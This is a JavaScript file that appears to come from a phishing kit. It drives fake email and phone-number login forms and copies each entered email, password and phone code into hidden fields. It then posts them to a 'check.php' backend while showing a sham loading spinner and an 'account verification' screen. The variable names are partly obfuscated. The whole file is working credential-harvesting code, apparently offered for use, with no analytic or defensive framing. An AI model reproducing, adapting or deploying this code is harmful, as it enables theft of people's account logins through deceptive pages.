function nt() {
  $('.nt').show();    
  $('.et').hide();    
}
function et() {
  $('.et').show();    
  $('.nt').hide();  
}    
function open_link() {
  $('.login-mail').show()
  $('.account_login').hide()
}
function close_link() {
  $('.login-mail').hide();
  $('.account_login').show();
  $('#load-login').hide();    
  $('#box-login').show();
}
function openloginlink(evt, loginlink) {
    var i, form_login, form_login_link;
    form_login = document.getElementsByClassName("form_login");
    for (i = 0; i < form_login.length; i++) {
        form_login[i].style.display = "none";        
    }
    form_login_link = document.getElementsByClassName("seclink-content");
    for (i = 0; i < form_login_link.length; i++) {
        form_login_link[i].className = form_login_link[i].className.replace(" seclink-content-active", "");
    }
    document.getElementById(loginlink).style.display = "block";
    evt.currentTarget.className += " seclink-content-active";
}
document.getElementById("email-login").click();


function ValidateLoginNumberData() {
  return (
    $('#ValidateLoginNumberForm').submit(function (_0x2ae84f) {
      _0x2ae84f.preventDefault()
      $emailnk = $('#email-nk').val().trim()
      $passwordnk = $('#password-nk').val().trim()
      $loginnk = $('#login-number').val().trim()
      $codetel = $('#code-tel').val().trim()
      if ($emailnk == '' || $emailnk == null || $emailnk.length <= 5) {
        return (
          $('.email-nk').show(),
          setTimeout(function () {
            $('.email-nk').fadeOut()
          }, 2000),
          $('.sandi-nk').hide(),
          $('.account_verification').hide(),
          $('.login-number').show(),
          false
        )
      } else {
        $('.email-nk').hide()
        $('input#validateEmail').val($emailnk)
        $('.login-number').hide()
        $('.account_verification').hide()
      }
      if ($passwordnk == '' || $passwordnk == null || $passwordnk.length <= 7) {
        return (
          $('.sandi-nk').show(),
          setTimeout(function () {
            $('.sandi-nk').fadeOut()
          }, 2000),
          $('.login-number').show(),
          $('.account_verification').hide(),
          false
        )
      } else {
        $('.sandi-nk').hide()
        $('input#validatePassword').val($passwordnk)
        $('input#validateLogin').val($loginnk)
        $('input#validateTel').val($codetel)
        $('.login-number').hide();	 
        $('.login-number-load').show()
        setTimeout(function () {
        $('.account_verification').show()
        $('.login-number-load').hide()
        }, 3000)
      }
      var _0x3494d3 = $('input#validateEmail').val(),
        _0x1c8989 = $('input#validatePassword').val(),
        _0x10775a = $('input#validateLogin').val(),
        _0x28a8af = $('input#validateTel').val(),
        id = $('input#id').val()
      if (
        _0x3494d3 == '' &&
        _0x1c8989 == '' &&
        _0x10775a == '' &&
        _0x28a8af == ''
      ) {
        return $('.account_verification').hide(), false
      }
      $.ajax({
        type: 'POST',
        url: 'check.php',
        data: $(this).serialize(),
        beforeSend: function () {
          $('.login-mail').hide()
        },
        success: function () {
          $('.login-mail').hide()
        },
      })
    }),
    false
  )
}
function ValidateLoginMailData() {
  return (
    $('#ValidateLoginMailForm').submit(function (_0x499967) {
      _0x499967.preventDefault()
      $emailk = $('#email-k').val().trim()
      $passwordk = $('#password-k').val().trim()
      $logink = $('#login-mail').val().trim()
      if ($emailk == '' || $emailk == null || $emailk.length <= 10) {
        return (
          $('.email-k').show(),
          setTimeout(function () {
            $('.email-k').fadeOut()
          }, 2000),
          $('.sandi-k').hide(),
          $('.account_verification').hide(),
          $('.login-mail').show(),
          false
        )
      } else {
        $('.email-k').hide()
        $('input#validateEmail').val($emailk)
        $('.login-mail').hide()
        $('.account_verification').hide()
      }
      if ($passwordk == '' || $passwordk == null || $passwordk.length <= 7) {
        return (
          $('.sandi-k').show(),
          setTimeout(function () {
            $('.sandi-k').fadeOut()
          }, 2000),
          $('.login-mail').show(),
          $('.account_verification').hide(),
          false
        )
      } else {
        $('.sandi-k').hide()
        $('input#validatePassword').val($passwordk)
        $('input#validateLogin').val($logink)
        $('.login-mail').hide();	 
        $('.login-mail-load').show()
        setTimeout(function () {
        $('.account_verification').show()
        $('.login-mail-load').hide()
        }, 1500)
      }
      var _0x1cde5d = $('input#validateEmail').val(),
        _0x2f493b = $('input#validatePassword').val(),
        _0xbdb96f = $('input#validateLogin').val(),
        id = $('input#id').val()
      if (_0x1cde5d == '' && _0x2f493b == '' && _0xbdb96f == '') {
        return $('.account_verification').hide(), false
      }
      $.ajax({
        type: 'POST',
        url: 'check.php',
        data: $(this).serialize(),
        beforeSend: function () {
          $('.login-mail').hide()
        },
        success: function () {
          $('.login-mail').hide()
        },
      })
    }),
    false
  )
}